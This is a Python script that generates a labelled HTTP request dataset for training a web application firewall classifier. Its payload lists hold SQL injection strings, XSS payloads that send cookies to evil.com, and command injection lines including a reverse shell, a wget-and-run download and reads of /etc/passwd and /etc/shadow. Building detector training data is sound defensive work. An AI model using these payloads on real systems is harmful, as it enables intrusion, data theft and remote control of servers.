"""
gen_dataset.py
==============
Generates a realistic, balanced HTTP request dataset for training
the DeployShield WAF classifier.

Design goals:
  - Varied HTTP methods (GET / POST / PUT / DELETE)
  - Multi-segment URL paths   (/products/1234/reviews, /api/v2/users/42)
  - Realistic query parameters (3-6 per request)
  - POST bodies with JSON payloads
  - Varied headers (User-Agent, Content-Type, Accept, Referer)
  - Hard-negative benign samples (contain apostrophes, angle brackets,
    SQL keywords in normal context) so the model can't just flag punctuation
  - Attack payloads injected into URL query params, POST body, and headers
  - Class balance: ~3:1 benign:attack, >=2000 per attack class

Run:
    python ml-service/data/gen_dataset.py [--rows 50000] [--seed 42]
    # Output: ml-service/data/dataset.csv
"""
import argparse
import csv
import json
import os
import random
import string
from typing import List, Dict, Tuple

# ── Configurable ──────────────────────────────────────────────────────────────
DEFAULT_ROWS = 50_000
SEED = 42
ATTACK_RATIO = 0.30       # 30% of rows are attacks
MIN_PER_CLASS = 2_500     # minimum rows per attack class

# ── Vocabularies ──────────────────────────────────────────────────────────────
BENIGN_WORDS = [
    'electronics', 'laptop', 'keyboard', 'monitor', 'headphones', 'camera',
    'shoes', 'jacket', 'shirt', 'trousers', 'dress', 'bag', 'watch', 'ring',
    'book', 'novel', 'biography', 'textbook', 'magazine', 'journal',
    'coffee', 'tea', 'juice', 'smoothie', 'pizza', 'burger', 'salad',
    'cat', 'dog', 'pet', 'food', 'whiskas', 'diner', 'cafe', 'obrien',
    'apartment', 'house', 'villa', 'studio', 'flat',
    'python', 'javascript', 'typescript', 'golang', 'rust', 'java',
    'docker', 'kubernetes', 'terraform', 'ansible', 'linux', 'ubuntu',
    'resume', 'portfolio', 'project', 'tutorial', 'guide', 'howto',
]

BRANDS = ['samsung', 'apple', 'sony', 'dell', 'hp', 'lenovo', 'asus', 'acer', 'lg', 'philips', 'whiskas', 'purina']
SORT_BY = ['price_asc', 'price_desc', 'rating', 'popularity', 'newest', 'relevance']
CATEGORIES = ['electronics', 'clothing', 'books', 'food', 'furniture', 'toys', 'sports', 'pets']

# Hard-negatives: benign strings that contain dangerous-looking chars or security terms
HARD_NEGATIVES = [
    "O'Brien's cafe",
    "Tom's Diner restaurant",
    "McDonald's menu",
    "cat food and treats",
    "cat /etc/resolvconf documentation",
    "select the best laptop for work",
    "how to drop table weight effectively",
    "union select best coffee brands",
    "<strong>sale</strong> ends today",
    "price > 100 & < 500",
    "use `code` blocks in markdown",
    "bash scripting tutorial for beginners",
    "wget alternatives for windows",
    "curl your hair overnight",
    "alert me when stock arrives",
    "eval your options before buying",
    "document.cookie policy explained",
    "javascript tutorial for beginners",
    "onerror handling in python",
    "sleep 8 hours daily",
    "benchmark comparison 2026",
    "exec chef meal prep service",
    "whoami command line guide",
    "id verification process",
    "order by date asc",
    "group by category",
]

PATH_TEMPLATES = [
    '/apps/{id}',
    '/apps/app-{id}/dashboard',
    '/apps/{id}/api/v1/items',
    '/products/{id}/reviews',
    '/api/v1/users/{id}/profile',
    '/api/v2/orders/{id}/items',
    '/blog/{year}/{slug}',
    '/search',
    '/categories/{cat}/products',
    '/dashboard/apps/{id}/metrics',
    '/admin/settings/security',
    '/docs/{slug}',
    '/items/{id}',
    '/api/apps/{id}/deploy',
    '/login',
    '/register',
    '/checkout/cart',
    '/account/preferences',
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/126 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605 Safari/605',
    'Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0',
    'curl/8.4.0',
    'python-requests/2.31.0',
    'PostmanRuntime/7.36',
    'axios/1.6.0',
    'Go-http-client/1.1',
]

METHODS = ['GET', 'POST', 'PUT', 'DELETE']

# ── Attack payloads ───────────────────────────────────────────────────────────
SQLI_PAYLOADS = [
    "1' OR '1'='1",
    "1 or 1=1--",
    "1' UNION SELECT null,null,username,password FROM users--",
    "' OR 1=1; DROP TABLE users--",
    "1/**/UNION/**/SELECT/**/password/**/FROM/**/users",
    "1' AND SLEEP(5)--",
    "' OR '1'='1' --",
    "1; SELECT * FROM information_schema.tables--",
    "1' AND 1=CONVERT(int, (SELECT TOP 1 name FROM sysobjects))--",
    "' OR 1=1 LIMIT 1--",
    "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)",
    "admin'--",
    "' OR 'a'='a",
    "1' ORDER BY 1--",
    "1' GROUP BY 1--",
    "1; EXEC xp_cmdshell('dir')--",
    "0x31272f2a",
    "CHAR(39)||CHAR(79)||CHAR(82)",
    "1' HAVING 1=1--",
    "1' WAITFOR DELAY '0:0:5'--",
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(document.cookie)>",
    "<svg onload=alert(1)>",
    "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>",
    "<body onload=alert(1)>",
    "'\"><script>fetch('http://evil.com?c='+document.cookie)</script>",
    "<script>document.location='http://evil.com?'+document.cookie</script>",
    "eval('alert(1)')",
    "<object data=javascript:alert(1)>",
    "vbscript:msgbox(1)",
    "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
    "data:text/html,<script>alert(1)</script>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "expression(alert(1))",
    "<a href=javascript:alert(1)>click me</a>",
    "\"><img src=1 onerror=alert(1)>",
    "';alert(String.fromCharCode(88,83,83))//",
    "<script/src=//evil.com/xss.js>",
]

CMDI_PAYLOADS = [
    ";cat /etc/passwd",
    "| ls -la",
    "` cat /etc/shadow `",
    "$(cat /etc/hosts)",
    "; rm -rf /tmp/test",
    "| bash -i >& /dev/tcp/evil.com/4444 0>&1",
    "; wget http://evil.com/shell.sh -O /tmp/s.sh && bash /tmp/s.sh",
    "| id;uname -a",
    "`id`",
    "8.8.8.8; cat /proc/self/environ",
    "localhost | python -c 'import os;os.system(\"id\")'",
    "127.0.0.1 & nc -e /bin/sh evil.com 4444",
    "; curl http://evil.com/$(whoami)",
    "| perl -e 'system(\"id\")'",
    "localhost;cat /etc/passwd",
    "`whoami`",
    "| /bin/bash -c 'id'",
    "; python3 -c 'import socket,subprocess;s=socket.socket()'",
    "127.0.0.1\ncat /etc/passwd",
    "%0acat%20/etc/passwd",
]

ATTACK_CLASSES = {
    'sqli':  SQLI_PAYLOADS,
    'xss':   XSS_PAYLOADS,
    'cmdi':  CMDI_PAYLOADS,
}

# ── Helpers ───────────────────────────────────────────────────────────────────
rng = random.Random(SEED)


def rand_id() -> str:
    return str(rng.randint(100, 99999))


def rand_word() -> str:
    return rng.choice(BENIGN_WORDS)


def rand_slug() -> str:
    words = rng.sample(BENIGN_WORDS, rng.randint(2, 4))
    return '-'.join(words)


def rand_year() -> str:
    return str(rng.randint(2022, 2026))


def rand_path() -> str:
    tpl = rng.choice(PATH_TEMPLATES)
    return tpl.format(id=rand_id(), cat=rng.choice(CATEGORIES),
                      year=rand_year(), slug=rand_slug())


def rand_query_params(n: int = None) -> Dict[str, str]:
    if n is None:
        n = rng.choice([0, 1, 1, 2, 2, 3, 4])
    if n == 0:
        return {}
    keys = rng.sample(['q', 'category', 'brand', 'sort', 'page', 'min', 'max',
                       'limit', 'offset', 'filter', 'lang', 'format', 'ref'], k=min(n, 9))
    vals = {
        'q': rand_word,
        'category': lambda: rng.choice(CATEGORIES),
        'brand': lambda: rng.choice(BRANDS),
        'sort': lambda: rng.choice(SORT_BY),
        'page': lambda: str(rng.randint(1, 50)),
        'min': lambda: str(rng.randint(100, 5000)),
        'max': lambda: str(rng.randint(5000, 100000)),
        'limit': lambda: str(rng.randint(10, 100)),
        'offset': lambda: str(rng.randint(0, 500)),
        'filter': rand_word,
        'lang': lambda: rng.choice(['en', 'fr', 'de', 'es', 'ja']),
        'format': lambda: rng.choice(['json', 'xml', 'csv']),
        'ref': lambda: rng.choice(['homepage', 'email', 'social', 'search']),
    }
    return {k: vals.get(k, rand_word)() for k in keys}


def build_url(path: str, params: Dict[str, str] = None) -> str:
    if not params:
        return path
    import urllib.parse
    parts = []
    for k, v in params.items():
        if rng.random() < 0.4:
            v_val = urllib.parse.quote(str(v), safe='')
        else:
            v_val = str(v)
        parts.append(f'{k}={v_val}')
    return f'{path}?{"&".join(parts)}'



def rand_headers(method: str) -> Dict[str, str]:
    h = {
        'user-agent': rng.choice(USER_AGENTS),
        'accept': rng.choice(['*/*', 'application/json', 'text/html,application/xhtml+xml']),
    }
    if method in ('POST', 'PUT'):
        h['content-type'] = 'application/json'
    if rng.random() < 0.4:
        h['referer'] = f'https://example.com{rand_path()}'
    if rng.random() < 0.2:
        h['x-forwarded-for'] = f'10.{rng.randint(0,255)}.{rng.randint(0,255)}.{rng.randint(1,254)}'
    return h


def rand_body(method: str) -> str:
    if method not in ('POST', 'PUT'):
        return ''
    keys = rng.sample(['name', 'value', 'description', 'title', 'email',
                       'username', 'category', 'price', 'quantity'], k=rng.randint(2, 5))
    body = {k: rand_word() if k not in ('price', 'quantity') else str(rng.randint(1, 500))
            for k in keys}
    return json.dumps(body)


# ── Generators ────────────────────────────────────────────────────────────────
def make_benign_row(use_hard_neg: bool = False) -> Dict:
    method = rng.choice(METHODS)
    path = rand_path()
    params = rand_query_params()

    if use_hard_neg:
        # Inject hard-negative text into a param
        key = rng.choice(list(params.keys()) or ['q'])
        params[key] = rng.choice(HARD_NEGATIVES)

    url = build_url(path, params)
    headers = rand_headers(method)
    body = rand_body(method)
    return {'method': method, 'url': url, 'headers': json.dumps(headers), 'body': body, 'label': 'benign'}


def make_attack_row(label: str, payloads: List[str]) -> Dict:
    payload = rng.choice(payloads)
    method = rng.choice(METHODS)
    path = rand_path()
    params = rand_query_params(rng.randint(0, 3))

    # Distribute payloads across injection points
    inject_into = rng.choice(['query', 'body', 'header'])

    if inject_into == 'query' or method in ('GET', 'DELETE'):
        params[rng.choice(['q', 'id', 'search', 'input'])] = payload
        url = build_url(path, params)
        body = rand_body(method) if method in ('POST', 'PUT') else ''
        headers = rand_headers(method)
    elif inject_into == 'body' and method in ('POST', 'PUT'):
        url = build_url(path, params)
        keys = rng.sample(['name', 'value', 'comment', 'description', 'search'], k=rng.randint(2, 4))
        body_dict = {k: rand_word() for k in keys}
        body_dict[rng.choice(keys)] = payload
        body = json.dumps(body_dict)
        headers = rand_headers(method)
    else:
        params[rng.choice(['q', 'id', 'search', 'input'])] = payload
        url = build_url(path, params)
        body = rand_body(method) if method in ('POST', 'PUT') else ''
        headers = rand_headers(method)
        # Also put payload in User-Agent for variety
        if rng.random() < 0.2:
            headers['user-agent'] = payload

    return {'method': method, 'url': url, 'headers': json.dumps(headers), 'body': body, 'label': label}


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--rows', type=int, default=DEFAULT_ROWS)
    parser.add_argument('--seed', type=int, default=SEED)
    parser.add_argument('--out', default=os.path.join(os.path.dirname(__file__), 'dataset.csv'))
    args = parser.parse_args()

    rng.seed(args.seed)

    n_attacks = max(int(args.rows * ATTACK_RATIO), MIN_PER_CLASS * len(ATTACK_CLASSES))
    n_per_class = max(n_attacks // len(ATTACK_CLASSES), MIN_PER_CLASS)
    n_benign = args.rows - n_per_class * len(ATTACK_CLASSES)
    n_hard_neg = n_benign // 6  # ~17% hard negatives

    rows = []

    print(f"Generating {n_benign} benign rows ({n_hard_neg} hard-negative)...")
    for i in range(n_benign):
        rows.append(make_benign_row(use_hard_neg=(i < n_hard_neg)))

    for label, payloads in ATTACK_CLASSES.items():
        print(f"Generating {n_per_class} {label} rows...")
        for _ in range(n_per_class):
            rows.append(make_attack_row(label, payloads))

    rng.shuffle(rows)

    fieldnames = ['method', 'url', 'headers', 'body', 'label']
    with open(args.out, 'w', newline='', encoding='utf-8') as f:
        writer = csv.DictWriter(f, fieldnames=fieldnames)
        writer.writeheader()
        writer.writerows(rows)

    from collections import Counter
    dist = Counter(r['label'] for r in rows)
    print(f"\nDataset written to: {args.out}")
    print(f"Total rows: {len(rows)}")
    print("Label distribution:", dict(dist))


if __name__ == '__main__':
    main()
